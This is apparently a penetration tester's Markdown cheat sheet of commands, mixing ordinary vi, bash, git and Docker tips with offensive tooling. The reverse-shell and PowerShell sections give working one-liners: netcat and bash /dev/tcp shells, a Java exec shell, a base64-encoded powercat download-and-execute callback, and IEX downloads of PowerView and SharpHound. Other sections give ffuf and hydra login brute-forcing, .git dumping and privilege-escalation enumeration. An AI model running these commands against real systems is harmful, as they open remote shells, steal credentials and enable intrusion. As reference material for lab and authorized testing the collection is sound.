# Commands

## vi (setup)

```sh
cat /etc/vim/vimrc.local 
set paste
set cursorline
set number
```

## Bash

```sh
ctrl-r: search through command history, right arrow key to put match on the command line, repeat ctrl-r to cycle through more results 
ctrl-w: delete the last word
ctrl-u: delete the content from current cursor back to the start of the line
ctrl-k: kill to the end of the line 
ctrl-a: move cursor to beginning of line  
ctrl-e: move cursor to end of line 
ctrl-l: clear the screen. 
ctrl-<arrow-keys>: move by word
```

## Git

```sh

# general

git branch -a
git checkout master
git pull
git checkout -b <New_branch_name>
git push origin <new_branch_name_you_created>

# found a .git on a website? Dump content:

git clone https://github.com/internetwache/GitTools

gitdumper.sh http://target.tld/.git/ dest-dir

cd dest-dir

git status
git log # show the commit history
git show commit_id # view commit changes (recover a secret password?)
```
## Remote Desktop

```sh
xfreerdp /v:10.10.8.80 /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
```

## DNS enumeration

```sh
# subdomain brute force
dnsenum --threads 64 --dnsserver 10.11.12.13 -f SecLists/Discovery/DNS/subdomains-top1million-5000.txt youdomain.com
# DNS zone transfer
dig axfr yourdomain.com @10.11.12.13
```

## Port Enumeration 

```sh
sudo masscan -p1-65535 10.10.10.77 --rate=1000 -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
sudo nmap -Pn -sV -sC -p$ports 10.10.10.77 -oA nmap
```
### Using proxychains

```sh
sudo proxychains nmap -sT -p22 -n 192.168.1.0/24
```

### Show local ports listening

```sh
ss -tulpn
```

## Generate Wordlist for hashcat or john

<https://github.com/stealthsploit/Optimised-hashcat-Rule>

```sh
echo "Summer2021" | hashcat -r OneRuleToRuleThemAll.rule --stdout > wordlist.txt
# John
john --wordlist=wordlist.txt hash.txt
# hashcat
hashcat -m <format_id> hash.txt wordlist.txt --force # foramt_id, e.g. 18200, see link below
```
<https://hashcat.net/wiki/doku.php?id=example_hashes>

## Web

```sh
# web-content discovery
feroxbuster -u http://10.10.10.110:8080 # very fast, configure your wordlist in /etc/feroxbuster/ferox-config.toml 
gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -l -t 30 -e -k -x .html,.php -u http://example.com -o gob_raft_80.txt
# subdomains
gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://example.com -o gob_vhost_80.txt
# user enum
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
# brute force
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
# subdomain brute force (try first without -fs: it will return a lot of succesfull responses, now filter the size with -fs 
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.domain.xyz" -u http://MACHINE_IP -fs 2395
# hydra login form brute force
hydra -l p.smith -P passwords.txt MACHINE_IP http-post-form '/login.php:login_username=p.smithn&secretkey=^PASS^:Unknown user or password incorrect.'

```

## Find / grep

### SUID / SGID binaries
```sh
sudo find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
### find binaries with special capabilities

```sh
getcap -r / 2>/dev/null
```

### find files that contain "pass". 
```sh
grep -iRl "pass" * | more
```

## Python

```sh
mkdir environment
cd environment
python3 -m venv my_env
source my_env/bin/activate

# Alternative:
virtualenv my_env
source my_env/bin/activate
```

## tcpdump
```sh
# to verify that your machine gets ping'ed (e.g. by your malicious remote "ping" command)
sudo tcpdump ip proto \\icmp -i tun0
```
## Reverse shells

https://www.revshells.com/

### Shell
```sh
# Works most of the time, useful when nc has no -e option
/bin/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 8621 >/tmp/f
# Depends on the netcat version (some do not have -e)
nc -e /bin/sh 10.10.14.5 8621
# Try it, depends on bash
bash -c "bash -i >& /dev/tcp/10.10.14.5/8621 0>&1"
```
### Java

```java
public class RuntimeDemo {

   public static void main(String[] args) {
      try {

         String[] cmdArray = {"/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.5/8622;cat <&5 | while read line; do $line 2>&5 >&5; done"};
         Process process = Runtime.getRuntime().exec(cmdArray,null);
      } catch (Exception ex) {
         ex.printStackTrace();
      }
   }
}
```

## Socat

```sh
# Tunnel a connection from a local TCP port to a remote service
socat -v tcp4-listen:8000,reuseaddr,fork tcp4:10.10.12.15:80 
```
## ssh

**Scenario Remote**: I'm on the victim machine and want to expose an internal port of that machine to my attacker machine:
```sh
ssh -l attacker ATTACKER_IP -R8088:127.0.0.1:8080
```
Now on my attacker machine, I can just navigate to http://127.0.0.1:8088

**Scenario Local**: This example opens a connection to the gw.example.com jump server, and forwards any connection to port 80 on the local machine to port 80 on intra.example.com.

```sh
ssh -L 80:intra.example.com:80 gw.example.com
```

## Powershell

### Start-Process cmd as other user

```powershell
Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
```

### Encoded commands

```powershell
$command="ping -n 3 10.10.10.10"
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))
powershell.exe -encoded $Encoded
```
### Reverse Shell with powercat

This downloads powercat from your webserver on port 9000 and calls back to your local listener (nc -nvlp 1234) 

```powershell
$command={IEX(New-Object System.Net.WebClient).DownloadString('http://10.13.14.3:9000/powercat.ps1'); powercat -c 10.13.14.3 -p 1234 -e cmd}
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))
```
The command can be prepared locally and copy/pasted to the victim, then just run:

```
powershell.exe -encoded <base64 string from $Encoded above here>
```

Port Scanning

```powershell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("localhost", $_)) "Port $_ is open!"} 2>$null
```
```bat
netstat -aon | findstr /i "listening"
```
Downloading

```powershell
$url="http://10.10.14.13:9000/SharpHound.exe"
$output="C:\Windows\System32\spool\drivers\color\SharpHound.exe"
(New-object system.net.webclient).downloadfile($url,$output)

(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.13:9000/PowerUp.ps1", "C:\Windows\System32\spool\drivers\color\PowerUp.ps1")
```

Reflective Downloading

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.7:9000/PowerView.ps1')
```

Size of Folder

```powershell
"{0} MB" -f ((Get-ChildItem C:\users\ -Recurse -force | Measure-Object -Property Length -Sum -ErrorAction Stop).Sum / 1MB)
```

Compress

```powershell
Compress-Archive -LiteralPath <PathToFolder> -DestinationPath <PathToDestination>
```
Find Files

```powershell
gci -force -recurse -file -ea silentlycontinue  

Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -force -ErrorAction SilentlyContinue

FindDate=Get-Date -Year 2016 -Month 06 -Day 24
Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate }
Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate -and $_.LastWriteTime -le $Finddate.adddays(1) }
```
## Docker
 
```sh
docker pull nginx:1.19.4-alpine
docker images
docker run --name my-nginx -d -p 9080:80 nginx:1.19.4-alpine # -d: detached mode
docker logs -f my-nginx # -f: like tail -f, follow the log
docker inspect my-nginx

# Having a Dockerfile

docker build -t xxx:yyy .

# Running

docker ps # running containers
docker ps -a  # also not running
docker ps -q # quite, only IDs

docker start [container]
docker stop [container]
docker restart [container]

docker kill $(docker ps -q)
docker rm $(docker ps -a -q)

docker exec -ti my-nginx /bin/sh
docker run -ti --rm --name my-ngnix nginx:1.19.4-alpine /bin/sh

# Mount folder

docker run -ti --rm --name my-ngnix -v /home/kali:/mnt nginx:1.19.4-alpine /bin/sh 

# Dangling images

docker images --filter "dangling=true"
docker rmi $(docker images -q --filter "dangling=true")

docker system prune -a

# History
docker history nginx:1.19.4-alpine
```

## Useful links

<https://github.com/swisskyrepo/PayloadsAllTheThings>

<https://book.hacktricks.xyz/>

<https://gtfobins.github.io/>

<https://github.com/LOLBAS-Project/LOLBAS/blob/master/README.md>

<https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf>

